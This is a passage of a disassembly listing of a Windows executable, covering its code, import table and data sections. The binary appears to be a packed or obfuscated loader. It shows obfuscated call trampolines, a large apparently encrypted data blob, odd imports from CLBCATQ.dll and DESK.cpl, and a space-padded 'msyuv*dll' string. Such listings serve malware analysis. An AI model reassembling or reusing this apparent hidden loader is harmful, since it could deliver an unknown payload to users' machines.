		mov	eax, ds:Sleep
		jmp	eax
sub_401F30	endp


; =============== S U B	R O U T	I N E =======================================


sub_401F53	proc near		; CODE XREF: sub_401F30+16p
		pop	ecx
		call	ecx
		push	edi
		push	dword ptr [edi+154h]
		push	dword ptr [edi+37Ch]
		push	dword ptr [edi+90h]
		push	ebx
		call	sub_40138C
		add	esp, 10h
		pop	edi
		db	3Eh
		call	sub_401F80
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401F53	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401F80	proc near		; CODE XREF: sub_401F53+20p
		pop	ecx
		call	ecx
		add	esp, 20h
		pop	ebp
		retn	0
sub_401F80	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 32h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401FBC	proc near		; CODE XREF: sub_40119C+1Dp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		lea	eax, [ebx+0ECh]
		or	esi, 0FFFFFFFDh
		push	eax
		mov	ebx, 0
		push	ebx
		db	3Eh
		call	sub_401FE1
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401FBC	endp


; =============== S U B	R O U T	I N E =======================================


sub_401FE1	proc near		; CODE XREF: sub_401FBC+18p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	dword ptr [eax+3ECh]
		push	dword ptr [eax+268h]
		call	sub_401D20
		add	esp, 8
		pop	eax
		push	eax
		push	0
		db	3Eh
		call	sub_40200B
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_401FE1	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40200B	proc near		; CODE XREF: sub_401FE1+1Dp
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 44h
		pop	ebp
		retn	0
sub_40200B	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C2h	dup(90h)
		dd 719112F6h, 0A5F28FD9h, 621EB34Dh, 44A7BF56h,	0C65DD49Eh
		dd 0B57DC58Ah, 8D500790h, 0D317ABB2h, 0A4DC3F29h, 7F4A7245h
		dd 0B8D985A1h, 638F4788h
		db 0CAh, 0B2h
word_40210A	dw 3F50h		; DATA XREF: sub_4015A3+19o
		dd 0E791AF2Eh, 8EB72868h, 46FAC542h, 0A6ADF6A4h, 82ACC631h
		dd 0C2A77F45h, 2C953521h, 0EAB5656Fh, 0F08E5E82h, 0B6EB042Ah
		dd 0A5F6EA4Eh, 0AE05DB30h, 2E5E3D32h, 0C15CB866h, 210DE6D0h
		dd 70F95D10h, 0F3F9517Ch, 7894A29h, 7246B7EBh, 0C7DCB4C4h
		dd 0F7A529Dh, 82C2D6B4h, 0B48190ECh, 0E7279AF4h, 755B9EF1h
		dd 0B63395CFh, 0FAE5886Ch, 6D93C4D1h, 0BCFC8597h, 6AEA2299h
		dd 1FFB5018h, 79D85747h, 0C7981AE5h, 5D1E0B51h,	5200FABFh
		dd 0DDA3EAA0h, 12180AAFh, 20450A7h, 7F9CDDA5h, 0CE01912Dh
		dd 98F9081Eh, 0BA2835F0h, 0C7DEE507h, 221A763Fh, 4D4FC4E0h
		dd 0B0FC5217h, 0A886D0DCh, 31F47F91h, 6010C037h, 5061A04Fh
		dd 0AF33A5D7h, 0B40E8313h, 266326C3h, 21CDC4F2h, 0C6EA6DABh
		dd 49E0C881h, 0B18EF317h, 0ABE26E8Ch, 7119C8B9h, 4EF7A8DFh
		dd 0EFC522F6h, 9F128E84h, 252B10F6h, 22430296h,	6F46831Fh
		dd 0C8DCBEA0h, 9BE4F120h, 0B01897C5h, 92480489h, 362F54BFh
		dd 4F3C61F6h, 0AF352607h, 24713C87h, 0ED2606B0h, 954508FDh
		dd 72267F4Fh, 0D20539E5h, 4E0C8364h, 51FCD28Fh,	0DECB4DC8h
		dd 25E1E47Bh, 0AF03CE47h, 0AE066067h, 9137448Ch, 38E4624Bh
		dd 0AB199765h, 2D691C71h, 0E1CE71C7h, 0A010C630h, 0B3041C72h
		dd 0B24E4DC1h, 78292BF3h, 0AE3DBB5Dh, 28387355h, 9F3CD2ABh
		dd 5BD4EE6Ah, 0C661142Ah, 2925758Fh, 0B370A690h, 8F798EE0h
		dd 39C3399Bh, 0E49EE51Ah, 8E18E572h, 0B8F38D86h, 2FDCA1B2h
		dd 0D1823B22h, 18BEE679h, 0A4D68C27h, 694B9ECh,	8C1E395h
		dd 54D81A76h, 0E19866DDh, 9BABB791h, 7CAD4843h,	0EA1AE71Ah
		dd 837C8375h, 5B32475Dh, 6928D3B7h, 0D860B624h,	14E84651h
		dd 0B616DCD7h, 0AD6D1AC4h, 92DDC89Ch, 0B7911E28h, 2E103A48h
		dd 4A140750h, 0DF33E4A8h, 923E0DABh, 0B9E151A2h, 0B304572Eh
		dd 0EE21D8F3h, 89EF378Ah, 3087643Ah, 9B0C5207h,	3E5A9ABCh
		dd 9D48B695h, 0B25C5B40h, 1D56D25Fh, 65D80A45h,	0D3A07969h
		dd 9A1A384Ah, 88F23BD5h, 0B1476719h, 7DDBA377h,	4DE87E44h
		dd 0CD8ED154h, 9F6695E1h, 5CC82ACFh, 0B06A768Fh, 921F1509h
		dd 3647C67Fh, 70322916h, 0D8A7707Bh, 0A4F2D352h, 8589CAE3h
		dd 0B27BA03Bh, 27C2D8FDh, 71141381h, 0CAF93ACCh, 9A8361BEh
		dd 27BD9FA0h, 42A04454h, 0BF9B88DEh, 0FA0A99F0h, 5A4C035Bh
		dd 0ABE65451h, 96A19C5Ah, 15729362h, 0E85289DAh, 0B7133116h
		dd 777B9BCAh, 0C557B62Ah, 2C5F24EAh, 6AD06E2Fh,	4B387F73h
		dd 0D168C046h, 984D23ECh, 27DC6E09h, 708A54A9h,	8C4626A6h
		dd 8A2F3DFDh, 3B50656Bh, 3AD7CD5Ah, 339901D6h, 671B837Fh
		dd 24F23E50h, 6EAAE559h, 48AA8D63h, 31A9C5A4h, 9504773Ah
		dd 414F8C8Eh, 0E3C20B81h, 4FD1FF28h, 82FDADD2h,	47F55917h
		dd 5D955299h, 59C957B3h, 61F54308h, 218982C0h, 20BA8EF2h
		dd 70B2B8EFh, 0B029FA88h, 0D8EA52C0h, 149AD707h, 0FA33EB7Ch
		dd 3F60A65h, 8BDAF9CDh,	159ED918h, 0FB08EBCDh, 0E47CFFE2h
		dd 15ACE0D1h, 83A77244h, 4A6F4A12h, 14BBE6DFh, 76A20CA1h
		dd 44AEE597h, 0DEC84734h, 0F283DC65h, 0DDBE11CCh, 92A0FED2h
		dd 0B6866896h, 7548CBB4h, 0FFFFCEB1h, 818018B0h, 3FBFBB8Fh
		dd 6C9EAE38h, 0C96F91AEh, 5CFC3728h, 0D94AA5BCh, 0A1FEB1E2h
		dd 0DCA4AB0Fh, 83236AFCh, 0FAE5D5DAh, 4D9089D7h, 8E439889h
		dd 39E8ECDFh, 79738990h, 53C63B37h, 0B5F2EF1Bh,	268F41C3h
		dd 72A05F1Eh, 20AFD070h, 0EFA797B0h, 2D20BE27h,	3BB30208h
		dd 1CC467BDh, 0F29DCC42h, 40E18E26h, 608F38EFh,	89E0D7D0h
		dd 0BC8F9438h, 0DBD8AA2Bh, 9393AAEEh, 70CE9ED0h, 0C898B0D8h
		dd 0D5C41BDBh, 969DF216h, 6EB97B3Ch, 0C9A342A2h, 27AED2F6h
		dd 4D6BF046h, 5B3A5D68h, 18CD633Eh, 0DCE6D9D9h,	0F10919Eh
		dd 7C6BB789h, 4D22993Ch, 1A7413A7h, 0B94F0BA1h,	2892CC6Bh
		dd 0D4B699CAh, 96A4B4C0h, 389DA8F9h, 9F79577Bh,	3E38ACB7h
		dd 64401EA7h, 9B0B4D29h, 0A7C3DEC7h, 60EEBDA7h,	5333FBEEh
		dd 0BAC805F2h, 26FCC068h, 0E181EC49h, 10CEF1EDh, 0F5238709h
		dd 7AEDC1CFh, 6671CA1Eh, 0AEC71AF1h, 0FE9BD34Ah, 0C8AA196h
		dd 3F45FBAAh, 0C92D527Bh, 9CF556C2h, 72DB53F1h,	0BF1DA660h
		dd 59D9D1C3h, 1C93171Eh, 12DAB8FAh, 3209C0Eh, 0FFEFB6B6h
		dd 992988A4h, 0BFEB3BADh, 89DB8E99h, 3C9E38B3h,	0A206E2F9h
		dd 3EB49B10h, 30310279h, 0DDB774Fh, 7AAAE5BDh, 83398D21h
		dd 9FA69A9Bh, 33CD9F33h, 0B013066h, 0AEFF67CFh,	1380B70Eh
		dd 9315A381h, 0A4A06CAh, 860F529Ah, 40147AF7h, 6080FEC4h
		dd 0D0BF815Eh, 1914FFD5h, 7348D45Bh, 8760CE28h,	3C237E61h
		dd 266F5925h, 0EDC85592h, 26C049BFh, 0D5009E81h, 16001D2Bh
		dd 237463D2h, 0E233367Bh, 8E3AC838h, 0F967A039h, 83203858h
		dd 0FF74E429h, 12FDB5Fh, 74567BB8h, 3D3B2A8Ah, 0B236DD2Bh
		dd 0AAECE769h, 1B14990Fh, 0B36007C9h, 26260385h, 0BD450A93h
		dd 0A947CB0Ah, 0AC0302D0h, 66897E97h, 0DF82C1D8h, 7BBE9F13h
		dd 0E794097Dh, 387C8688h, 14BB3B49h, 0A1FB0CC4h, 0AF2D3D4Eh
		dd 2C416DAEh, 2D4055EDh, 3FB0D462h, 61A834B7h, 153942A4h
		dd 0FAA3E21Eh, 13D25379h, 0F796D6A0h, 5B494AFh,	0FEA5B610h
		dd 3413E7F7h, 33B072FAh, 0CD552CDDh, 0A24A39C4h, 0BFDDD19Eh
		dd 8E7C1730h, 0BDC052F5h, 2D914C84h, 0A41D9434h, 0E27E7B36h
		dd 0F56E2882h, 0E63EBBF1h, 5613F3CAh, 4DB8315Ch, 0C5A65B56h
		dd 0A16D064Ch, 89C65F9Bh, 0A41A5BF5h, 2E5AD66Fh, 40D294D8h
		dd 3595B5FEh, 0E7A5B011h, 0DAE2CE3h, 62A5748Eh,	4FAD46BDh
		dd 2EA8AFF8h, 51AC1224h, 0D8A9F76Eh, 941507B2h,	0B65D7D90h
		dd 7C514137h, 0C3FBB563h, 9F832A12h, 94F2DF6h, 0D0D43A04h
		dd 0D42044A0h, 0CE3D2AB3h, 54BF3755h, 62C0EAEEh, 0C180ECD1h
		dd 5C9FA570h, 804B9A26h, 639B0789h, 3C8B1884h, 2BB88B6Bh
		dd 0D7EA3FF5h, 9893099Fh, 1A70223Bh, 8F07EFF9h,	1B79304h
		dd 0BF31FE60h, 34E9272Ch, 668C23A9h, 4DB9EE2Bh,	0DAA308EAh
		dd 93AE7B8Ah, 0B7A8C23Ah, 0A5AB9EE2h, 0AEAA308Eh, 0B7AAE7B8h
		dd 7BAA8C24h, 0C7AAB9F2h, 6532A306h, 25E6DD69h,	44F2BFDDh
		dd 27100DBFh, 0ADD69F93h, 0Dh dup(0)
		dd 200h	dup(?)
_text		ends

; Section 2. (virtual address 00003000)
; Virtual size			: 000B7000 ( 749568.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 0005FC00
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 403000h
; BOOL __stdcall LocalUnlock(HLOCAL hMem)
LocalUnlock	dd ?			; DATA XREF: sub_40128D+Br
					; sub_401CA8+Br ...
; DWORD	__stdcall GetTickCount()
GetTickCount	dd ?			; DATA XREF: sub_401090+27r
					; sub_4013CB+Fr ...
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
UnmapViewOfFile	dd ?			; DATA XREF: sub_401B02+2Ar
					; sub_401FE1+23r
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
CreateFileA	dd ?
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
GetModuleHandleA dd ?			; DATA XREF: sub_401181+4o
					; sub_40138C+38r ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
LoadLibraryA	dd ?			; DATA XREF: sub_40155C+33o
					; sub_40155C+40r ...
; void __stdcall SetLastError(DWORD dwErrCode)
SetLastError	dd ?			; DATA XREF: sub_40133C+Dr
; BOOL __stdcall CloseHandle(HANDLE hObject)
CloseHandle	dd ?			; DATA XREF: sub_40119C+32r
					; sub_4015A3+60r ...
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
LocalFree	dd ?			; DATA XREF: sub_401A30+26r
					; sub_401CC4+20r
; int __stdcall	lstrlenA(LPCSTR	lpString)
lstrlenA	dd ?			; DATA XREF: sub_401140+3Ar
					; sub_4011D5+Fr ...
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
GetSystemTime	dd ?
; LPWSTR __stdcall GetCommandLineW()
GetCommandLineW	dd ?			; DATA XREF: sub_401A5D+Br
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
CreateThread	dd ?			; DATA XREF: start+8r .rdata:0040303Co
; DWORD	__stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer)
GetCurrentDirectoryA dd	?
; BOOL __stdcall GetComputerNameA(LPSTR	lpBuffer, LPDWORD nSize)
GetComputerNameA dd ?
		dd offset CreateThread
; BOOL __stdcall SetEvent(HANDLE hEvent)
SetEvent	dd ?			; DATA XREF: sub_401258+2Er
					; sub_401426+11r ...
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
HeapCreate	dd ?
; BOOL __stdcall PulseEvent(HANDLE hEvent)
PulseEvent	dd ?			; DATA XREF: sub_4012EB+Fr
					; sub_40147C+29r ...
; void __stdcall Sleep(DWORD dwMilliseconds)
Sleep		dd ?			; DATA XREF: sub_4012AC+38r
					; sub_401F30+1Cr
		dd 0
;
; Imports from USER32.dll
;
; HDC __stdcall	GetDC(HWND hWnd)
GetDC		dd ?			; DATA XREF: sub_4010BE+Dr
					; sub_40130C+29r ...
; BOOL __stdcall IsWindow(HWND hWnd)
IsWindow	dd ?
; int __stdcall	FillRect(HDC hDC, const	RECT *lprc, HBRUSH hbr)
FillRect	dd ?
; HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem)
GetDlgItem	dd ?
; BOOL __stdcall DrawMenuBar(HWND hWnd)
DrawMenuBar	dd ?
; BOOL __stdcall DrawEdge(HDC hdc, LPRECT qrc, UINT edge, UINT grfFlags)
DrawEdge	dd ?
; LRESULT __stdcall DispatchMessageA(const MSG *lpMsg)
DispatchMessageA dd ?
; BOOL __stdcall GetScrollBarInfo(HWND hwnd, LONG idObject, PSCROLLBARINFO psbi)
GetScrollBarInfo dd ?
; LRESULT __stdcall CallWindowProcA(WNDPROC lpPrevWndFunc, HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
CallWindowProcA	dd ?
; BOOL __stdcall CheckRadioButton(HWND hDlg, int nIDFirstButton, int nIDLastButton, int	nIDCheckButton)
CheckRadioButton dd ?
; HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y,	int nWidth, int	nHeight, HWND hWndParent, HMENU	hMenu, HINSTANCE hInstance, LPVOID lpParam)
CreateWindowExA	dd ?
; HWND __stdcall SetFocus(HWND hWnd)
SetFocus	dd ?			; DATA XREF: sub_4014AC+Fr
					; sub_401ADC+1Fr ...
; SHORT	__stdcall GetKeyState(int nVirtKey)
GetKeyState	dd ?
		dd 0
;
; Imports from CLBCATQ.dll
;
SetSetupSave	dd ?
UpdateFromAppChange dd ?
SetupOpen	dd ?
DowngradeAPL	dd ?
CheckMemoryGates dd ?
		dd 0
;
; Imports from DESK.cpl
;
InstallScreenSaver dd ?
		dd 0
		dd 3110h, 2 dup(0)
		dd 32F2h, 3000h, 3164h,	2 dup(0)
		dd 33C2h, 3054h, 319Ch,	2 dup(0)
		dd 3424h, 308Ch, 31B4h,	2 dup(0)
		dd 3446h, 30A4h, 5 dup(0)
		dd 3244h, 31BCh, 32E0h,	3236h, 3260h, 3290h, 3280h, 3252h
		dd 31CCh, 32C4h, 31EEh,	3216h, 32D0h, 31FEh, 32B0h, 32A0h
		dd 3274h, 3228h, 31D8h,	31E6h, 0
		dd 335Ch, 33AAh, 33B6h,	3300h, 330Eh, 331Ch, 3396h, 333Ah
		dd 3328h, 3364h, 3378h,	338Ah, 334Eh, 0
		dd 33F2h, 340Eh, 3402h,	33CEh, 33DEh, 0
		dd 3430h, 0
		dd 654701C7h, 63695474h, 756F436Bh, 746Eh, 6F4C0349h, 466C6163h
		dd 656572h, 7550039Bh, 4565736Ch, 746E6576h, 4B30000h
		dd 65656C53h, 2790070h,	53746547h, 65747379h, 6D69546Dh
		dd 1C00065h
aGetcurrentdire	db 'GetCurrentDirectoryA',0
		align 2
		dw 188h
aGetcommandline	db 'GetCommandLineW',0
		db 0F1h	; ñ
		db 4, 48h, 65h
aApcreate	db 'apCreate',0
		align 2
aK		db 'Š',0
aCreatefilea	db 'CreateFileA',0
		db  4Fh	; O
		db 3, 4Ch, 6Fh
aCalunlock	db 'calUnlock',0
aT		db 'T',0
aClosehandle	db 'CloseHandle',0
		db  77h	; w
		db 1, 47h, 65h
aTmodulehandlea	db 'tModuleHandleA',0
		align 4
		db  5Ah	; Z
		db 4, 53h, 65h
aTevent		db 'tEvent',0
		align 10h
		db  74h	; t
		db 4, 53h, 65h
aTlasterror	db 'tLastError',0
		align 10h
		db  3Dh	; =
		db 3, 4Ch, 6Fh
aAdlibrarya	db 'adLibraryA',0
		align 10h
		db '·',0
aCreatethread	db 'CreateThread',0
		align 10h
		db  8Eh	; Ž
		db 1, 47h, 65h
aTcomputernamea	db 'tComputerNameA',0
		align 4
		db  4Eh	; N
		db 5, 6Ch, 73h
aTrlena		db 'trlenA',0
		align 10h
		db '·',0
aCreatethread_0	db 'CreateThread',0
		align 10h
		db 0D7h	; ×
		db 4, 55h, 6Eh
aMapviewoffile	db 'mapViewOfFile',0
aKernel32_dll	db 'KERNEL32.dll',0
		align 10h
		db  0Ch
aGetdlgitem	db 7,'GetDlgItem',0
		align 2
		dw 6AEh
aDrawmenubar	db 'DrawMenuBar',0
		db 0A8h	; ¨
		db 6, 44h, 72h
aAwedge		db 'awEdge',0
		align 4
		db 0FBh	; û
		db 5, 43h, 61h
aLlwindowproca	db 'llWindowProcA',0
aYGetscrollbari	db 'Y',7,'GetScrollBarInfo',0
		align 2
aGetkeystate	db '"',7,'GetKeyState',0
		dd 65470706h, 434474h, 68430626h, 526B6365h, 6F696461h
		dd 74747542h, 6E6Fh, 72430652h,	65746165h, 646E6957h, 7845776Fh
		dd 7110041h, 46746553h,	7375636Fh, 6930000h, 70736944h
		dd 68637461h, 7373654Dh, 41656761h, 7C00000h, 69577349h
		dd 776F646Eh, 6DB0000h,	6C6C6946h, 74636552h, 53550000h
		dd 32335245h, 6C6C642Eh, 40000h, 6E776F44h, 64617267h
		dd 4C504165h, 90000h, 63656843h, 6D654D6Bh, 4779726Fh
		dd 73657461h, 1E0000h, 53746553h, 70757465h, 65766153h
		dd 1F0000h, 75746553h, 65704F70h, 6006Eh
aUpdatefromappc	db 'UpdateFromAppChange',0
aClbcatq_dll	db 'CLBCATQ.dll',0
		db    6
		align 2
aInstallscreens	db 'InstallScreenSaver',0
		align 2
aDesk_cpl	db 'DESK.cpl',0
		align 10h
		dd 6Ch dup(0)
		dd 2DA80h dup(?)
_rdata		ends

; Section 3. (virtual address 000BA000)
; Virtual size			: 0000040A (   1034.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00060200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 4BA000h
		dd 23h dup(20202020h)
dword_4BA08C	dd 2 dup(20202020h)	; DATA XREF: sub_40155C+Fo
dword_4BA094	dd 4 dup(20202020h)	; DATA XREF: sub_401F30+8o
dword_4BA0A4	dd 20202020h		; DATA XREF: sub_40119C+8o
dword_4BA0A8	dd 3 dup(20202020h)	; DATA XREF: sub_401ADC+8o
dword_4BA0B4	dd 6 dup(20202020h)	; DATA XREF: sub_401678+8o
aMsyuvDll	db '                                                    msyuv*dll',0
					; DATA XREF: sub_401090+8o
		align 4
		dd 3 dup(0)
dword_4BA118	dd 0			; DATA XREF: sub_40130C+8o
dword_4BA11C	dd 7 dup(0)		; DATA XREF: sub_401A30+8o
dword_4BA138	dd 6 dup(0)		; DATA XREF: sub_401258+8o
dword_4BA150	dd 32h dup(0)		; DATA XREF: sub_401CC4+8o
dword_4BA218	dd 1Dh dup(0)		; DATA XREF: sub_4012AC+8o
dword_4BA28C	dd 1Dh dup(0)		; DATA XREF: sub_401BF0+8o
dword_4BA300	dd 10h dup(0)		; DATA XREF: sub_401B70+8o
dword_4BA340	dd 19h dup(0)		; DATA XREF: sub_401838+8o
dword_4BA3A4	dd 2 dup(0)		; DATA XREF: sub_401C74+8o
dword_4BA3AC	dd 95h dup(0)		; DATA XREF: sub_401140+8o
		align 1000h
_data		ends


		end start
